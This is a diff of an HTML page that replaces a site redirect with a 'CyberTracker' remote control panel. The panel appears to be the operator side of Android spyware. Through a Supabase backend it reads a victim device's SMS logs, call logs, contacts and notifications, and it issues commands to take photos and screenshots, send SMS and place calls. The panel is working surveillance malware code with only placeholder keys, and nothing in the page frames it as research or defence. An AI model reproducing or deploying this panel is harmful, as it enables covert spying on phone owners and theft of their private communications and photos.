@@ -2,34 +2,103 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Welcome to The Lamp RKP - Redirecting you to the official website. Explore knowledge and insights at our new domain.">
-  <meta name="keywords" content="The Lamp, Redirect, SEO, Knowledge Platform, The Lamp RKP">
-  <meta name="author" content="The Lamp RKP Organization">
-  <title>Welcome to The Lamp RKP </title>
-
-  <!-- SEO Meta Tags -->
-  <meta name="robots" content="index, follow">
-  <meta property="og:title" content="Welcome to The Lamp RKP - Official Website">
-  <meta property="og:description" content="Redirecting to The Lamp RKP's official website. Stay updated with knowledge and insights.">
-  <meta property="og:url" content="https://the-lamp.github.io/">
-  <meta property="og:type" content="website">
-  <meta property="og:image" content="https://thelamp.site/TheLampBanner.png">
-
-  <!-- Canonical Tag for SEO -->
-  <meta http-equiv="refresh" content="0; URL=https://thelamp.site">
-  
-  <script>
-    (function () {
-      // Target URL
-      const newUrl = "https://thelamp.site";
-      // Perform redirection
-      window.location.href = newUrl;
-    })();
-  </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberTracker Control Panel</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
 </head>
 <body>
-  <h1>The Lamp RKP</h1>
-  <p>If you are not redirected automatically, click <a href="https://thelamp.site">here</a>.</p>
+    <h1>CyberTracker - Remote Control Panel</h1>
+
+    <div class="container">
+        <button onclick="fetchDeviceInfo()">📱 Fetch Device Info</button>
+        <button onclick="fetchSMS()">📩 View SMS Logs</button>
+        <button onclick="fetchCallLogs()">📞 View Call Logs</button>
+        <button onclick="fetchContacts()">📖 View Contacts</button>
+        <button onclick="fetchNotifications()">🔔 View Notifications</button>
+        <button onclick="capturePhoto()">📷 Capture Photo</button>
+        <button onclick="takeScreenshot()">🖥 Capture Screenshot</button>
+        <button onclick="sendSMS()">📤 Send SMS</button>
+        <button onclick="makeCall()">📲 Make Call</button>
+        <button onclick="changeWallpaper()">🖼 Change Wallpaper</button>
+    </div>
+
+    <div id="output"></div>
+
+    <script>
+        // Supabase Config
+        const SUPABASE_URL = "https://YOUR_SUPABASE_PROJECT_URL.supabase.co";
+        const SUPABASE_ANON_KEY = "YOUR_SUPABASE_ANON_KEY";
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        async function fetchDeviceInfo() {
+            let { data, error } = await supabase.from("Device_Info").select("*");
+            if (error) {
+                console.error(error);
+            } else {
+                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+            }
+        }
+
+        async function fetchSMS() {
+            let { data, error } = await supabase.from("SMS_Logs").select("*");
+            if (error) {
+                console.error(error);
+            } else {
+                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+            }
+        }
+
+        async function fetchCallLogs() {
+            let { data, error } = await supabase.from("Call_Logs").select("*");
+            if (error) {
+                console.error(error);
+            } else {
+                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+            }
+        }
+
+        async function fetchContacts() {
+            let { data, error } = await supabase.from("Contacts").select("*");
+            if (error) {
+                console.error(error);
+            } else {
+                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+            }
+        }
+
+        async function fetchNotifications() {
+            let { data, error } = await supabase.from("Notifications").select("*");
+            if (error) {
+                console.error(error);
+            } else {
+                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+            }
+        }
+
+        async function capturePhoto() {
+            await supabase.from("Commands").insert([{ action: "capture_photo" }]);
+        }
+
+        async function takeScreenshot() {
+            await supabase.from("Commands").insert([{ action: "take_screenshot" }]);
+        }
+
+        async function sendSMS() {
+            let number = prompt("Enter Phone Number:");
+            let message = prompt("Enter Message:");
+            await supabase.from("Commands").insert([{ action: "send_sms", number: number, message: message }]);
+        }
+
+        async function makeCall() {
+            let number = prompt("Enter Phone Number:");
+            await supabase.from("Commands").insert([{ action: "make_call", number: number }]);
+        }
+
+        async function changeWallpaper() {
+            let imageUrl = prompt("Enter Image URL:");
+            await supabase.from("Commands").insert([{ action: "change_wallpaper", url: imageUrl }]);
+        }
+    </script>
 </body>
 </html>
